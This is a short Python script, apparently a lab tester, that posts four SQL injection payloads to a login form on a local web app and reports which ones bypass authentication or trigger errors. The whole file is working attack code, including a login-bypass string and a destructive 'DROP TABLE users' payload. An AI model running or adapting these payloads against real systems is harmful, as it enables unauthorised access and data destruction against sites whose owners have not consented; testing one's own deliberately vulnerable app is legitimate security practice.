import requests

URL = 'http://127.0.0.1:5000/'
payloads = [
    "' OR '1'='1",
    "' OR 'a'='a",
    "'; DROP TABLE users --",
    "' UNION SELECT NULL, NULL --"
]

for p in payloads:
    data = {'username': p, 'password': 'irrelevant'}
    response = requests.post(URL, data=data)
    print(f"[*] Payload: {p}")
    if "✅ Login Successful" in response.text:
        print(f"[!] Vulnerable: {p}")
    elif "❗ Error Detected" in response.text:
        print(f"[!] Error Triggered: {p}")
    else:
        print("[OK] No effect.")
    print("-" * 30)
